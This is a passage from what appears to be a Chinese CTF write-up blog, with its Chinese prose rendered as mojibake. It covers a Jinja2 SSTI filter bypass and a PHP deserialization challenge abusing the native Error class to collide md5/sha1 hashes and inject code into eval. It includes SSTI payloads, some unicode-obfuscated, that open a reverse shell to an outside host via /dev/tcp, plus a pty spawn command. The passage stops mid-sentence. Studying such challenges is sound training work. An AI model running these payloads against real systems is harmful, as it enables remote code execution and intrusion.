class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬å°±å°†å…¶ä¸­çš„å‘½ä»¤æ‰§è¡Œç›¸å…³çš„ä»£ç ç»™æ›¿æ¢æˆæˆ‘ä»¬ä¸Šé¢çš„evalå‡½æ•°ä¸­çš„ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;__class__&quot;))|attr(&quot;__base__&quot;))|attr(&quot;__subclasses__&quot;))()|attr(80))|attr(&quot;__init__&quot;))|attr(&quot;__globals__&quot;))|attr(&quot;get&quot;)(&quot;builtins&quot;))|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;subprocess&#x27;).call(&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/your_ip/your_listening_port 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x&quot;,shell=True)&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>å†ç»Ÿä¸€å¯¹ä¸Šé¢åŒå¼•å·å†…çš„å­—ç¬¦ä¸²è¿›è¡Œunicodeç¼–ç ï¼Œpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print((((((((&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(80))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u0073\u0075\u0062\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0027\u0029\u002e\u0063\u0061\u006c\u006c\u0028\u0022\u0065\u0063\u0068\u006f\u0020\u0027\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0031\u0030\u002e\u0034\u0032\u002e\u0032\u0033\u0034\u002e\u0035\u0036\u002f\u0039\u0032\u0030\u0030\u0020\u0030\u003e\u0026\u0031\u0027\u003e\u0078\u0020\u0026\u0026\u0020\u0062\u0061\u0073\u0068\u0020\u0078\u0020\u0026\u0026\u0020\u0072\u006d\u0020\u002d\u0072\u0066\u0020\u0078\u0022\u002c\u0073\u0068\u0065\u006c\u006c\u003d\u0054\u0072\u0075\u0065\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>æ”»å‡»æœºä¸Šç›‘å¬ç›¸åº”ç«¯å£åï¼Œåœ¨ç½‘é¡µä¸­å‘é€è¿™ä¸ªurlå‚æ•°ï¼Œå°±å¯ä»¥æˆåŠŸåå¼¹shelläº†ï¼š</p><p><a href="https://pic.imgdb.cn/item/62668a2a239250f7c597ffe1.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a2a239250f7c597ffe1.png"></a></p><p>åœ¨è¿™é‡Œå†ç§‘æ™®ä¸€äº›æœ‰å…³äºåå¼¹shellçš„çŸ¥è¯†ï¼šé€šè¿‡ä»¥ä¸Šæ–¹æ³•åå¼¹shellè·å–çš„ç›®æ ‡ä¸»æœºçš„è™šæ‹Ÿç»ˆç«¯ä½¿ç”¨éå¸¸ä¸ç¨³å®šï¼Œå¾ˆå®¹æ˜“æ–­å¼€è¿æ¥ã€‚è¿™å¾€å¾€éƒ½æ˜¯å› ä¸ºæˆ‘ä»¬è·å–çš„shellå¹¶ä¸æ˜¯æ ‡å‡†çš„è™šæ‹Ÿç»ˆç«¯ï¼Œä¸ºäº†èƒ½å¤Ÿå®Œæˆè¾“å…¥å¯†ç ç­‰æ“ä½œï¼Œæˆ‘ä»¬å¿…é¡»æ¨¡æ‹Ÿä¸€ä¸ªçœŸæ­£çš„ç»ˆç«¯è®¾å¤‡ã€‚æˆ‘ä»¬å…¶å®å¯ä»¥å€ŸåŠ©äºpythoné»˜è®¤åŒ…å«çš„ä¸€ä¸ªptyæ ‡å‡†åº“æ¥è·å–ä¸€ä¸ªæ ‡å‡†çš„è™šæ‹Ÿç»ˆç«¯ç¯å¢ƒã€‚Pythonåœ¨ç°åœ¨ä¸€èˆ¬å‘è¡Œç‰ˆLinuxç³»ç»Ÿä¸­éƒ½ä¼šè‡ªå¸¦ï¼Œæ‰€ä»¥ä½¿ç”¨èµ·æ¥ä¹Ÿè¾ƒä¸ºæ–¹ä¾¿ï¼Œå³ä½¿æ²¡æœ‰å®‰è£…ï¼Œæˆ‘ä»¬æ‰‹åŠ¨å®‰è£…ä¹Ÿå¾ˆæ–¹ä¾¿ã€‚æˆ‘ä»¬åªéœ€åœ¨è·å–çš„shellé‡Œé¢è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå³å¯æ¨¡æ‹Ÿä¸€ä¸ªç»ˆç«¯è®¾å¤‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/62668a54239250f7c5985d4c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a54239250f7c5985d4c.png"></a></p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>æ‰“å¼€ç¯å¢ƒï¼Œç½‘ç«™ç›´æ¥ç»™å‡ºæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬æŸä¸ªå¤§é»‘é˜”è¯´flagåœ¨/flagé‡Œ</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Snert</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\)|\(|\&#x27;|\&quot;|\&lt;\?php|post|get/&quot;</span>, <span class="variable">$this</span>-&gt;a, <span class="variable">$match</span>))&#123;</span><br><span class="line">                   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">die</span>(<span class="string">&quot;Get out,Hacker!!!!!&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;snert_is_good&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;snert_is_good&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯é€‰æ‰‹å¯¹PHPçš„åŸç”Ÿç±»åœ¨CTFä¸­çš„åˆ©ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹æ–¹æ³•éå†PHPçš„å†…ç½®ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é“é¢˜ç›®ä¸­ä½¿ç”¨çš„æ˜¯<code>Error/Exception</code> å†…ç½®ç±»ã€‚<code>Error</code>ç±»æ˜¯phpçš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œä½¿ç”¨äºphp7ç‰ˆæœ¬ã€‚<code>Exception</code> é€‚ç”¨äºphp5ã€7ç‰ˆæœ¬ ï¼Œæ˜¯æ‰€æœ‰ç”¨æˆ·çº§å¼‚å¸¸çš„åŸºç±»ã€‚</p><h3 id="Errorç±»ï¼š"><a href="#Errorç±»ï¼š" class="headerlink" title="Errorç±»ï¼š"></a>Errorç±»ï¼š</h3><p>ç±»æ‘˜è¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Error implements Throwable &#123;</span><br><span class="line">    /* å±æ€§ */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* æ–¹æ³• */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»å±æ€§ï¼š</p><ul><li><p>messageï¼šé”™è¯¯æ¶ˆæ¯å†…å®¹</p></li><li><p>codeï¼šé”™è¯¯ä»£ç </p></li><li><p>fileï¼šæŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</p></li><li><p>lineï¼šæŠ›å‡ºé”™è¯¯åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œæ•°</p></li></ul><p>ç±»æ–¹æ³•ï¼š</p><ul><li><p><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> â€” åˆå§‹åŒ– error å¯¹è±¡</p></li><li><p><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> â€” è·å–é”™è¯¯ä¿¡æ¯</p></li><li><p><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> â€” è¿”å›å…ˆå‰çš„ Throwable</p></li><li><p><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> â€” è·å–é”™è¯¯ä»£ç </p></li><li><p><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„æ–‡ä»¶</p></li><li><p><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„è¡Œå·</p></li><li><p><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> â€” è·å–è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</p></li><li><p><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²å½¢å¼çš„è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</p></li><li><p><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> â€” error çš„å­—ç¬¦ä¸²è¡¨è¾¾</p></li><li><p><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> â€” å…‹éš† error</p></li></ul><h3 id="Exception-ç±»"><a href="#Exception-ç±»" class="headerlink" title="Exception ç±»"></a>Exception ç±»</h3><p>ç±»æ‘˜è¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Exception &#123;</span><br><span class="line">    /* å±æ€§ */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* æ–¹æ³• */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç±»å±æ€§ï¼š</strong></p><ul><li><p>messageï¼šå¼‚å¸¸æ¶ˆæ¯å†…å®¹</p></li><li><p>codeï¼šå¼‚å¸¸ä»£ç </p></li><li><p>fileï¼šæŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å</p></li><li><p>lineï¼šæŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå·</p></li></ul><p>ç±»æ–¹æ³•ï¼š</p><ul><li><p><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> â€” å¼‚å¸¸æ„é€ å‡½æ•°</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> â€” è·å–å¼‚å¸¸æ¶ˆæ¯å†…å®¹</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> â€” è¿”å›å¼‚å¸¸é“¾ä¸­çš„å‰ä¸€ä¸ªå¼‚å¸¸</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> â€” è·å–å¼‚å¸¸ä»£ç </p></li><li><p><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> â€” åˆ›å»ºå¼‚å¸¸æ—¶çš„ç¨‹åºæ–‡ä»¶åç§°</p></li><li><p><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> â€” è·å–åˆ›å»ºçš„å¼‚å¸¸æ‰€åœ¨æ–‡ä»¶ä¸­çš„è¡Œå·</p></li><li><p><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> â€” è·å–å¼‚å¸¸è¿½è¸ªä¿¡æ¯</p></li><li><p><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸è¿½è¸ªä¿¡æ¯</p></li><li><p><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> â€” å°†å¼‚å¸¸å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p></li><li><p><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> â€” å¼‚å¸¸å…‹éš†</p></li></ul><p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨Errorå’ŒExceptionè¿™ä¸¤ä¸ªPHPåŸç”Ÿç±»ä¸­å†…åªæœ‰ <code>__toString</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºå°†å¼‚å¸¸æˆ–é”™è¯¯å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>å…ˆä»¥Errorä¸ºä¾‹ï¼Œçœ‹çœ‹å½“å®ƒè§¦å‘äº†__toStringæ–¹æ³•æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p><a href="https://pic.imgdb.cn/item/62668a93239250f7c598f60a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a93239250f7c598f60a.png"></a></p><p>å‘ç°è¿™å°†ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå½“å‰æŠ¥é”™ï¼ŒåŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯ï¼ˆâ€payloadâ€ï¼‰ä»¥åŠå½“å‰æŠ¥é”™çš„è¡Œå·ï¼ˆâ€2â€ï¼‰ï¼Œè€Œä¼ å…¥ <code>Error(&quot;payload&quot;,1)</code> ä¸­çš„é”™è¯¯ä»£ç â€œ1â€åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ã€‚</p><p>å†çœ‹ä¸‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><p><a href="https://pic.imgdb.cn/item/62668a9f239250f7c59916c0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668a9f239250f7c59916c0.png"></a></p><p>å¯è§ï¼Œ<code>$a</code> å’Œ <code>$b</code> è¿™ä¸¤ä¸ªé”™è¯¯å¯¹è±¡æœ¬èº«æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯ <code>__toString</code> æ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚æ³¨æ„ï¼Œè¿™é‡Œä¹‹æ‰€ä»¥éœ€è¦åœ¨åŒä¸€è¡Œæ˜¯å› ä¸º <code>__toString</code> è¿”å›çš„æ•°æ®åŒ…å«å½“å‰è¡Œå·ã€‚</p><p>å†çœ‹ä¸‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ç›¸åŒ&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ä¸ç›¸åŒ&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºä¸ºï¼š</p><p><a href="https://pic.imgdb.cn/item/62668aa9239250f7c5993370.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668aa9239250f7c5993370.png"></a></p><p>å¯ä»¥çœ‹åˆ°$aå³ä½¿ä¸$bæ˜¯ä¸åŒçš„å¯¹è±¡ï¼Œä½†æ˜¯å®ƒä»¬çš„md5å€¼ä¸sha1å€¼æ˜¯ç›¸åŒã€‚</p><p>å¦‚æœè¿˜æœ‰evalå‡½æ•°å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥æ„é€ ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;?&gt;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆšåˆšå‘ç°åœ¨è¾“å‡ºçš„å†…å®¹ä¸­åŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯â€™payloadâ€™ï¼Œé‚£å‡å¦‚å°†â€™payloadâ€™æ”¹ä¸º<code>?&gt;&lt;?php phpinfo();?&gt;</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶$açš„å€¼åº”è¯¥æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: ?&gt;&lt;?php phpinfo();?&gt; ?&gt; in D:\phpstudy_pro\WWW\test1.php:3 Stack trace: #0 &#123;main&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬æˆ‘ä»¬å°±æˆåŠŸæ„é€ 